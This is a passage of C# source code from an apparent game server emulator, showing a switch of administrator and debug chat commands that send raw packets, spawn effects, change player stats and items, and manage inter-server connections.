                          };

                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);

                                size = stream.Size;
                                stream.Seek(8);
                                stream.Write(x2);
                                stream.Write(y2);

                                stream.Seek(size);
                                stream.Finalize(1105);
                                client.Send(stream);

                                pp = new byte[]
                                {
                                    0x21,0xC2,0x82,0x00,0xFC,0xBB,0x0D,0x00,0xFA,0x05,0x00,0x00
,0x3C,0x01,0x9A,0x01,0x00,0x00,0x0C,0x00,0x00,0x00,0x00,0x0E,0x89,0x45,0x0F,0x00
,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3B,0x01,0x9B
,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                                };
                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);


                                stream.Finalize(1101);
                                size = stream.Size;
                                stream.Seek(16);
                                stream.Write(x1);
                                stream.Write(y1);
                                stream.Seek(60);
                                stream.Write(x2);
                                stream.Write(y2);

                                stream.Seek(size);

                                client.Send(stream);
                            }
                            break;
                        }
                    case "atest":
                        {

                            break;
                        }
                    case "ftest":
                        {
                            int size = 0;

                            byte[] pp = new byte[]
                            {
                         0x89,0x45,0x0F,0x00,0x3C,0x01,0x9A,0x01,0xBE,0x32,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00
                            };

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();


                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);


                                stream.Finalize(1105);
                                size = stream.Size;
                                stream.Seek(4);
                                stream.Write(client.Player.UID);
                                stream.Write((ushort)(client.Player.X - 1));
                                stream.Write((ushort)(client.Player.Y - 1));
                                stream.Seek(size);


                                client.Send(stream);




                                pp = new byte[]
                                {
                                   0xE3,0xBC,0x82,0x00,0xFC,0xBB,0x0D,0x00,0xFA,0x05,0x00,0x00
,0x3C,0x01,0x9A,0x01,0x00,0x00,0x0A,0x00,0x00,0x00,0x00,0x0E,0x89,0x45,0x0F,0x00
,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3B,0x01,0x9B
,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                };

                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(1101);
                                size = stream.Size;
                                stream.Seek(28);
                                stream.Write(client.Player.UID);
                                stream.Seek(16);
                                stream.Write((ushort)(client.Player.X - 1));
                                stream.Write((ushort)(client.Player.Y - 1));

                                stream.Seek(size);
                                client.Send(stream);



                                pp = new byte[]
                                {
                                 0xFC,0xBB,0x0D,0x00,0x3B,0x01,0x9B,0x01,0xBE,0x32,0x00,0x00
,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00
                                };
                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(1105);
                                size = stream.Size;
                                stream.Seek(4);
                                stream.Write(client.Player.UID);
                                stream.Write((ushort)(client.Player.X - 1));
                                stream.Write((ushort)(client.Player.Y - 1));
                                stream.Seek(size);


                                client.Send(stream);
                                pp = new byte[]
                                {
                                  0x21,0xC2,0x82,0x00,0xFC,0xBB,0x0D,0x00,0xFA,0x05,0x00,0x00
,0x3C,0x01,0x9A,0x01,0x00,0x00,0x0C,0x00,0x00,0x00,0x00,0x0E,0x89,0x45,0x0F,0x00
,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3B,0x01,0x9B
,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                                };


                                stream.InitWriter();
                                for (int x = 0; x < pp.Length; x++)
                                    stream.Write((byte)pp[x]);
                                stream.Finalize(1101);
                                size = stream.Size;
                                stream.Seek(28);
                                stream.Write(client.Player.UID);
                                stream.Seek(16);
                                stream.Write((ushort)(client.Player.X - 1));
                                stream.Write((ushort)(client.Player.Y - 1));
                                stream.Seek(size);
                                client.Send(stream);


                            }
                            break;
                        }
                    case "floor":
                        {
                            //for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                            {

                                //   for (int y = 20; y < 50; y++)
                                {
                                    //    for (int t = 0; t < 20; t++)
                                    // for (int x = 0; x < 2; x++)
                                    {

                                        //  for (int x = 0; x < 8; x++)

                                        /*  Game.MsgFloorItem.MsgItemPacket FloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                          FloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                          FloorPacket.m_ID = (ushort)(1380);
                                          FloorPacket.m_X = client.Player.X;
                                          FloorPacket.m_Y = client.Player.Y;

                                          FloorPacket.ItemOwnerUID = client.Player.UID;


                                          FloorPacket.m_Color = (byte)14;//4;
                                          FloorPacket.m_Color2 = (byte)14;//14
                                          FloorPacket.FlowerType = (byte)0;
                                          FloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                          using (var rec = new ServerSockets.RecycledPacket())
                                          {
                                              var packet = rec.GetStream();
                                              client.Send(packet.ItemPacketCreate(FloorPacket));
                                          }
                                      */
                                        //   FloorPacket.m_Color2 = 4;
                                        /*    FloorPacket.ItemOwnerUID = client.Player.UID;
                                           using (var rec = new ServerSockets.RecycledPacket())
                                            {
                                                var packet = rec.GetStream();
                                                client.Send(packet.ItemPacketCreate(FloorPacket));
                                            }
                             */
                                        /*     Game.MsgFloorItem.MsgItemPacket aFloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                             aFloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                             aFloorPacket.m_ID = (ushort)(1380);
                                             aFloorPacket.m_X = client.Player.X;
                                             aFloorPacket.m_Y = client.Player.Y;

     //                                        aFloorPacket.ItemOwnerUID = client.Player.UID;


                                             aFloorPacket.m_Color = (byte)3;//4;
                                             aFloorPacket.m_Color2 = 14;
                                             aFloorPacket.FlowerType = 0;
                                             aFloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                             using (var rec = new ServerSockets.RecycledPacket())
                                             {
                                                 var packet = rec.GetStream();
                                                 client.Send(packet.ItemPacketCreate(aFloorPacket));



                                             }

                                             break;
                                             */
                                        //   for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                                        {
                                            Game.MsgFloorItem.MsgItemPacket FloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                            FloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                            FloorPacket.m_ID = uint.Parse(data[1]);
                                            FloorPacket.m_X = client.Player.X;
                                            FloorPacket.m_Y = client.Player.Y;

                                            // FloorPacket.ItemOwnerUID = client.Player.UID;

                                            FloorPacket.Timer = Role.Core.TqTimer(DateTime.Now.AddSeconds(4));
                                            FloorPacket.m_Color = (byte)14;//4;
                                            FloorPacket.m_Color2 = (byte)14;//14
                                            FloorPacket.FlowerType = (byte)0;
                                            FloorPacket.DropType = MsgDropID.Effect;
                                            // FloorPacket.UnKnow = x;
                                            //   FloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                            using (var rec = new ServerSockets.RecycledPacket())
                                            {
                                                var packet = rec.GetStream();
                                                client.Player.View.SendView(packet.ItemPacketCreate(FloorPacket), true);
                                                //   client.Send(packet.ItemPacketCreate(FloorPacket));
                                            }
                                        }
                                        /*    for (uint x = 0; x < 20; x++)
                                            {
                                                Game.MsgFloorItem.MsgItemPacket aFloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                                aFloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                                aFloorPacket.m_ID = (ushort)(1390);
                                                aFloorPacket.m_X = client.Player.X;
                                                aFloorPacket.m_Y = client.Player.Y;

                                                //                                     aFloorPacket.ItemOwnerUID = client.Player.UID;

                                                aFloorPacket.Timer = Role.Core.TqTimer(DateTime.Now.AddSeconds(4));
                                                aFloorPacket.m_Color = (byte)2;//4;
                                                aFloorPacket.m_Color2 = (byte)14;
                                                aFloorPacket.FlowerType = (byte)2;
                                                aFloorPacket.UnKnow = x;
                                                aFloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                                using (var rec = new ServerSockets.RecycledPacket())
                                                {
                                                    var packet = rec.GetStream();
                                                 // client.Send(packet.ItemPacketCreate(aFloorPacket));
                                                    client.Player.View.SendView(packet.ItemPacketCreate(aFloorPacket), true);


                                                }
                                            }*/
                                        // break;


                                        /*        aFloorPacket.m_Color = 6;
                                                aFloorPacket.m_Color2 = (byte)14;
                                                aFloorPacket.ItemOwnerUID = 0;
                                                using (var rec = new ServerSockets.RecycledPacket())
                                                {
                                                    var packet = rec.GetStream();
                                                    client.Send(packet.ItemPacketCreate(aFloorPacket));
                                                }*/

                                    }
                                }
                                //ItemPacketCreate
                            }
                            break;
                        }
                    case "ac":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                bool finish = false;
                                foreach (var item in client.Inventory.ClientItems.Values)
                                {
                                    if (item.IsWeapon && !Database.ItemType.IsTwoHand(item.ITEM_ID) && !Database.ItemType.IsTrojanEpicWeapon(item.ITEM_ID))
                                    {
                                        uint UpdateToEpic = (item.ITEM_ID % 1000) + 614000;
                                        item.ITEM_ID = UpdateToEpic;
                                        item.Mode = Role.Flags.ItemMode.Update;
                                        item.Send(client, stream);
                                        finish = true;
                                        break;
                                    }
                                }
                                if (finish == false)
                                {
                                    foreach (var item in client.Equipment.ClientItems.Values)
                                    {
                                        if (item.IsWeapon && !Database.ItemType.IsTwoHand(item.ITEM_ID) && !Database.ItemType.IsTrojanEpicWeapon(item.ITEM_ID))
                                        {
                                            uint UpdateToEpic = (item.ITEM_ID % 1000) + 614000;
                                            item.ITEM_ID = UpdateToEpic;
                                            item.Mode = Role.Flags.ItemMode.Update;
                                            item.Send(client, stream);
                                            finish = true;
                                            break;
                                        }
                                    }
                                }
                                if (finish)
                                {
                                    client.Player.ResetEpicTrojan();


                                    Program.SendGlobalPackets.Enqueue(new MsgMessage("" + client.Player.Name + "~successfully~prevented~Twin~City~from~an~olden~massacre,~and~obtained~an~Epic~Weapon!", MsgMessage.MsgColor.red, MsgMessage.ChatMode.System).GetArray(stream));
                                    client.Inventory.Remove(3003340, 1, stream);
                                }
                            }
                            break;
                        }
                    case "floorr2":
                        {
                            for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                            {
                                Game.MsgFloorItem.MsgItemPacket FloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                FloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                FloorPacket.m_ID = x;
                                FloorPacket.m_X = client.Player.X;
                                FloorPacket.m_Y = client.Player.Y;

                                FloorPacket.ItemOwnerUID = client.Player.UID;


                                FloorPacket.m_Color = (byte)14;//4;
                                FloorPacket.m_Color2 = (byte)14;
                                FloorPacket.FlowerType = 2;
                                FloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var packet = rec.GetStream();
                                    client.Send(packet.ItemPacketCreate(FloorPacket));
                                }
                                FloorPacket.ItemOwnerUID = 0;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var packet = rec.GetStream();
                                    client.Send(packet.ItemPacketCreate(FloorPacket));
                                }
                            }
                            break;
                        }
                    case "eat":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                //   for(int i =0; i < 30; i++)
                                //for(int x = 0; x< 30; x++)
                                {
                                    Game.MsgFloorItem.MsgItemPacket effect = Game.MsgFloorItem.MsgItemPacket.Create();
                                    effect.m_UID = (uint)uint.Parse(data[1]);// Game.MsgFloorItem.MsgItemPacket.EffectMonsters.EarthquakeUpDown;
                                    effect.DropType = (MsgDropID)13;
                                    effect.m_X = client.Player.X;
                                    effect.m_Y = client.Player.Y;
                                    effect.ItemOwnerUID = client.Player.UID;
                                    client.Send(packet.ItemPacketCreate(effect));
                                }
                            }
                            break;
                        }
                    case "activetrap":
                        {
                            // for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                            {
                                Game.MsgFloorItem.MsgItemPacket FloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                FloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Count;
                                FloorPacket.m_ID = 1390;
                                FloorPacket.m_X = client.Player.X;
                                FloorPacket.m_Y = client.Player.Y;

                                FloorPacket.ItemOwnerUID = client.Player.UID;


                                FloorPacket.m_Color = (byte)0;//4;
                                FloorPacket.m_Color2 = (byte)14;
                                FloorPacket.FlowerType = 3;
                                FloorPacket.DropType = Game.MsgFloorItem.MsgDropID.RemoveEffect;
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var packet = rec.GetStream();
                                    client.Send(packet.ItemPacketCreate(FloorPacket));
                                }
                            }
                            break;
                        }
                    case "innerpotency":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                client.Player.InnerPower.AddPotency(packet, client, int.Parse(data[1]));
                            }
                            break;
                        }
                    case "inneritems":
                        {
                            foreach (var stage in Database.InnerPowerTable.Stages)
                            {
                                foreach (var gong in stage.NeiGongAtributes)
                                {
                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var packet = rec.GetStream();
                                        client.Inventory.Add(packet, gong.ItemID);
                                    }
                                }
                            }
                            break;
                        }
                    case "inner":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                packet.InitWriter();

                                packet.Write((ushort)16);
                                for (int x = 0; x < 16; x++)
                                {
                                    packet.Write((byte)(x + 1));
                                    packet.Write((uint)100);
                                }
                                // packet.Write((byte)2);
                                //packet.Write((uint)80);
                                //  packet.Write((byte)3);
                                // packet.Write((uint)100);
                                packet.Finalize(2612);
                                client.Send(packet);
                            }
                            break;
                        }
                    case "testinner":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();

                                var gong = new Role.Instance.InnerPower.Stage.NeiGong[2];
                                for (int x = 0; x < gong.Length; x++)
                                {
                                    gong[x] = new Role.Instance.InnerPower.Stage.NeiGong();
                                    gong[x].ID = (byte)(x + 1);
                                    gong[x].Unlocked = true;
                                    gong[x].Score = 100;
                                    gong[x].level = 5;
                                }
                                /* packet.InnerPowerStageInfo(  client.Player.UID, new Role.Instance.InnerPower.Stage()
                                 {
                                      ID =1, UnLocked= true, NeiGongs = new Role.Instance.InnerPower.Stage.NeiGong[2]
                                      {
                                          gong[0],gong[1]
                                      }
                                 });
                              */
                                client.Send(packet);
                            }
                            break;
                        }
                    case "innerstage":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                packet.InitWriter();
                                packet.Write(client.Player.UID);
                                packet.Write((uint)101);//score
                                packet.Write(1204);//think is potency


                                /*3C 00 33 0A 66 26 2D 00 8C 00 00 00 00 00 00 00      
01 00 02 00 04 00 01 00 05 64 01 02 00 02 28 00      ;    d ( 
01 00 02 64 00 00 00 01 00 04 64 00 00 00 02 00      ; d    d    
02 28 00 00 00 02 00 04 28 00 00 00 54 51 53 65      ;(    (   TQSe
72 76 65 72                                          ;rver*/


                                packet.Finalize(2610);
                                client.Send(packet);
                            }
                            break;
                        }

                    case "bodynpcs":
                        {
                            Game.MsgServer.MsgMovement.Bodyyyy = uint.Parse(data[1]);
                            break;
                        }
                    case "addd":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.ElitePkRankingCreate((MsgElitePkRanking.RankType)3, 2, MsgElitePKBrackets.GuiTyp.GUI_Top8Ranking, 0, client.Player.UID);
                                stream.ElitePkRankingFinalize();
                                client.Send(stream);
                            }
                            break;
                        }
                    case "aelite":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                stream.ElitePKBracketsCreate((MsgElitePKBrackets.Action)ushort.Parse(data[1]), 0, 0, MsgTournaments.MsgEliteTournament.GroupTyp.EPK_Lvl130Plus, MsgElitePKBrackets.GuiTyp.GUI_Top8Ranking, 0, 3);
                                stream.ElitePKBracketsFinalize();
                                Program.SendGlobalPackets.Enqueue(stream);
                            }
                            break;
                        }
                    case "teelite":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Send(stream.MsgInterServerIdentifier(0, client.Player.UID, uint.Parse(data[1]), client.GetAllMainItems().ToArray()));
                                client.Player.SendString(stream, MsgStringPacket.StringID.ServerName, false, data[2]);
                            }
                            break;
                        }
                    case "transfer":
                        {
                            client.Player.InitializeTransfer(ushort.Parse(data[1]));
                            break;
                        }
                    case "inter":
                        {

                            MsgInterServer.PipeClient.Connect(client, Database.GroupServerList.InterServer.IPAddress, Database.GroupServerList.InterServer.Port);
                            break;
                        }
                    case "attack"://attackmax
                        {
                            //client.Status.Defence = uint.MaxValue;
                            client.Status.MaxAttack = uint.Parse(data[1]);
                            client.Status.MinAttack = uint.Parse(data[1]) - 1;
                            break;
                        }
                    case "def":
                        {
                            client.Status.Defence = uint.Parse(data[1]);
                            break;
                        }
                    case "break":
                        {
                            client.Status.Breakthrough = uint.Parse(data[1]);
                            break;
                        }
                    case "crit":
                        {
                            client.Status.CriticalStrike = uint.Parse(data[1]);
                            break;
                        }
                    case "immu":
                        {
                            client.Status.Immunity = uint.Parse(data[1]);
                            break;
                        }
                    case "counter":
                        {
                            client.Status.Counteraction = uint.Parse(data[1]);
                            break;
                        }
                    case "block":
                        {
                            client.Status.Block = uint.Parse(data[1]);
                            break;
                        }
                    case "dodge":
                        {
                            client.Status.Dodge = uint.Parse(data[1]);
                            break;
                        }
                    case "mattack":
                        {
                            client.Status.MagicAttack = uint.Parse(data[1]);
                            break;
                        }
                    case "mdefence":
                        {
                            client.Status.MagicDefence = uint.Parse(data[1]);
                            break;
                        }
                    case "Pent":
                        {
                            client.Status.Penetration = uint.Parse(data[1]);
                            break;
                        }
                    case "scrit":
                        {
                            client.Status.SkillCStrike = uint.Parse(data[1]);
                            break;
                        }
                    case "fpa":
                        {
                            client.Status.PhysicalDamageIncrease = uint.Parse(data[1]);
                            break;
                        }
                    case "fpd":
                        {
                            client.Status.PhysicalDamageDecrease = uint.Parse(data[1]);
                            break;
                        }
                    case "fma":
                        {
                            client.Status.MagicDamageIncrease = uint.Parse(data[1]);
                            break;
                        }
                    case "fmd":
                        {
                            client.Status.MagicDamageDecrease = uint.Parse(data[1]);
                            break;
                        }
                    case "hp":
                        {
                            client.Player.HitPoints = int.Parse(data[1]);
                            client.Player.SendUpdateHP();
                            break;
                        }
                    case "championpoints":
                        {
                            client.Player.AddChampionPoints(uint.Parse(data[1]));
                            break;
                        }
                    case "opengui":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();

                                ActionQuery action = new ActionQuery()
                                {
                                    ObjId = client.Player.UID,
                                    Type = ActionType.OpenCustom,
                                    Timestamp = (int)Extensions.Time32.Now.Value,
                                    dwParam = uint.Parse(data[1]),
                                    wParam1 = client.Player.X,
                                    wParam2 = client.Player.Y,

                                };
                                client.Send(stream.ActionCreate(&action));


                            }
                            break;
                        }
                    case "t3t3":
                        {
                            for (uint x = 0; x < 10000; x++)
                            {
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var stream = rec.GetStream();
                                    var action = new ActionQuery()
                                    {
                                        ObjId = client.Player.UID,
                                        Type = ActionType.OpenCustom,
                                        Timestamp = (int)Extensions.Time32.Now.Value,
                                        dwParam = x,
                                        wParam1 = client.Player.X,
                                        wParam2 = client.Player.Y,
                                    };
                                    client.Send(stream.ActionCreate(&action));
                                    client.CreateBoxDialog("The Number of GUI = > " + x);
                                    System.Threading.Thread.Sleep(5000);
                                }
                            }
                            break;
                        }
                    case "tgui":
                        {
                            /*Data datapacket = new Data(true);
                                    datapacket.UID = client.Entity.UID;
                                    datapacket.ID = 162;
                                    datapacket.dwParam = 4020;
                                    datapacket.Facing = (Game.Enums.ConquerAngle)client.Entity.Facing;
                                    datapacket.wParam1 = 73;
                                    datapacket.wParam2 = 98;
                                    client.Send(datapacket);*/
                            var action = new ActionQuery()
                            {
                                ObjId = client.Player.UID,
                                Type = (ActionType)443,
                                dwParam = uint.Parse(data[1])

                            };
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                client.Send(packet.ActionCreate(&action));

                            }
                            break;
                        }
                    case "hair":
                        {
                            client.Player.Hair = (ushort)((client.Player.Hair - (client.Player.Hair % 100)) + ushort.Parse(data[1]));
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                client.Player.SendUpdate(packet, client.Player.Hair, MsgServer.MsgUpdate.DataType.HairStyle);

                            }
                            break;
                        }
                    case "interip":
                        {

                            MsgInterServer.PipeClient.Connect(client, data[1], ushort.Parse(data[2]));
                            break;
                        }
                    case "dcinter":
                        {

                            client.Socket.Disconnect();
                            break;
                        }
                    case "testactwar":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var item = client.MyWardrobe.GetAllItems();
                                var stream = rec.GetStream();
                                Game.MsgServer.MsgCoatStorage.CoatStorage store = new MsgCoatStorage.CoatStorage();
                                store.ActionID = (MsgCoatStorage.Action)uint.Parse(data[1]);
                                store.dwparam1 = item.FirstOrDefault().UID;
                                store.dwpram2 = item.FirstOrDefault().ITEM_ID;
                                client.Send(stream.CreateCoatStorage(store));
                                client.Send(stream.CreateCoatStorage(store));
                            }
                            break;
                        }
                    case "addtitle":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                client.Player.AddSpecialTitle((MsgTitleStorage.TitleType)ushort.Parse(data[1]), packet);
                            }

                            /*                            foreach (var atitle in Database.TitleStorage.Titles.Values)
                                                        {

                                                            MsgTitleStorage.TitleStorage title = new MsgTitleStorage.TitleStorage();
                                                            title.ActionID = (MsgTitleStorage.Action)uint.Parse(data[1]);
                                                            title.dwparam1 = 100;
                                                            title.dwparam2 = atitle.ID;
                                                            title.dwparam3 = atitle.SubID;
                                                            title.Title = new MsgTitleStorage.Title();
                                                            title.Title.ID =atitle.ID;
                                                            title.Title.SubId = atitle.SubID;
                                                         //   title.Title.dwparam1 =  atitle.Score;
                                                            using (var rec = new ServerSockets.RecycledPacket())
                                                            {
                                                                var packet = rec.GetStream();
                                                                packet.CreateTitleStorage(title);
                                                                client.Send(packet);

                                                            }
                                                        }*/

                            /*   for (uint x = 0; x < 40; x++)
                               {
                          
                                   Game.MsgServer.MsgCoatStorage.CoatStorage store = new MsgCoatStorage.CoatStorage();
                                        store.ActionID = (MsgCoatStorage.Action)x;
                                        store.dwparam1 = uint.Parse(data[1]);
                                        store.dwpram2 = uint.Parse(data[2]);
                                        store.dwpram3 = uint.Parse(data[3]);

                                   MsgTitleStorage.TitleStorage title = new MsgTitleStorage.TitleStorage();
                                   title.dwparam1 = x;//uint.Parse(data[1]);
                                   title.dwparam2 = uint.Parse(data[1]);
                                   title.dwparam3 = uint.Parse(data[2]);
                                   title.dwparam4 = uint.Parse(data[3]);
                                   title.test = new MsgTitleStorage.Title();
                                   title.test.dwparam1 = title.dwparam2;
                                   title.test.dwparam2 = title.dwparam3;
                                   using (var rec = new ServerSockets.RecycledPacket())
                                   {
                                       var packet = rec.GetStream();
                                       packet.CreateTitleStorage(title);
                                       client.Send(packet);
                                       client.Send(packet.CreateCoatStorage(store));
                                   }
                               }*/
                            break;
                        }
                    case "createunion":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                client.Player.MyUnion = Role.Instance.Union.Create(packet, client, "blab");
                                client.Player.MyUnion.AddGuild(packet, client.Player.MyGuild);

                            }
                            break;
                        }
                    case "title":
                        {
                            foreach (var atitle in Database.TitleStorage.Titles.Values)
                            {
                                if (atitle.ID == 2004)
                                {
                                    MsgTitleStorage.TitleStorage title = new MsgTitleStorage.TitleStorage();
                                    title.ActionID = (MsgTitleStorage.Action)uint.Parse(data[1]);
                                    title.dwparam1 = 100;
                                    title.dwparam2 = atitle.ID;
                                    title.dwparam3 = atitle.SubID;
                                    title.Title = new MsgTitleStorage.Title();
                                    title.Title.ID = atitle.ID;
                                    title.Title.SubId = atitle.SubID;
                                    title.Title.dwparam1 = 100;
                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var packet = rec.GetStream();
                                        packet.CreateTitleStorage(title);
                                        client.Send(packet);

                                    }
                                }
                            }
                            break;
                        }


                    case "floor2":
                        {
                            //for (ushort x = ushort.Parse(data[1]); x < ushort.Parse(data[2]); x++)
                            {
                                Game.MsgFloorItem.MsgItemPacket FloorPacket = Game.MsgFloorItem.MsgItemPacket.Create();
                                FloorPacket.m_UID = Game.MsgFloorItem.MsgItem.UIDS.Next;
                                FloorPacket.m_ID = 930;
                                FloorPacket.m_X = client.Player.X;
                                FloorPacket.m_Y = client.Player.Y;
                                FloorPacket.m_Color = 13;
                                FloorPacket.FlowerType = 2;
                                FloorPacket.Name = "AuroraLotus";
                                FloorPacket.DropType = Game.MsgFloorItem.MsgDropID.Effect;
                                FloorPacket.Timer = Role.Core.TqTimer(DateTime.Now.AddSeconds(5));
                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var packet = rec.GetStream();
                                    client.Send(packet.ItemPacketCreate(FloorPacket));
                                }
                                //ItemPacketCreate
                            }
                            break;
                        }
                    case "wea":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var packet = rec.GetStream();
                                packet.WeatherCreate((MsgWeather.WeatherType)ushort.Parse(data[1]), uint.Parse(data[2]), uint.Parse(data[3]), (uint)uint.Parse(data[4]), uint.Parse(data[5]));
                                client.Send(packet);
                            }
                            break;
                        }
                    case "activefairi":
                        {
                            unsafe
                            {
                                if (client.Player.testtttttttttt != 0)
                                {
                                    MsgTransformFairy afair = MsgTransformFairy.Create();
                                    afair.Mode = MsgTransformFairy.Action.Dezactive;
                                    afair.FairyType = client.Player.testtttttttttt;
                                    afair.UID = client.Player.UID;


                                    using (var rec = new ServerSockets.RecycledPacket())
                                    {
                                        var packet = rec.GetStream();
                                        packet.TransformFairyCreate(MsgTransformFairy.Action.Dezactive, client.Player.testtttttttttt, client.Player.UID);
                                        client.Send(packet);
                                    }
                                }


                                using (var rec = new ServerSockets.RecycledPacket())
                                {
                                    var packet = rec.GetStream();
                                    packet.TransformFairyCreate(MsgTransformFairy.Action.Active, uint.Parse(data[1]), client.Player.UID);
                                    client.Send(packet);
                                }



                                client.Player.testtttttttttt = uint.Parse(data[1]);
                            }
                            break;
                        }


                    case "ets":
                        {
                            client.Player.StageEpicTrojanQuest = byte.Parse(data[1]);
                            break;
                        }

                    case "gift":
                        {
                            client.Player.MainFlag = 0;
                            break;
                        }
                    case "exit":
                        {
                            Program.ProcessConsoleEvent(0);
                            break;
                        }
                    case "quiz":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();




                                client.Send(stream.QuizShowCreate((MsgServer.MsgQuizShow.AcotionID)ushort.Parse(data[1]), (ushort)5, 0, 0, 0, (ushort)900, 600, 300,
                                 "TEst1", "TEst1", "TEst1", "TEst1", "TEst1"));


                            }
                            break;
                        }
                    case "switch":
                        {

                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.SwitchWingWalkerAttack(stream);
                            }
                            break;
                        }
                    case "mainflag":
                        {
                            using (var rec = new ServerSockets.RecycledPacket())
                            {
                                var stream = rec.GetStream();
                                client.Player.MainFlag = (Role.Player.MainFlagType)uint.Parse(data[1]);
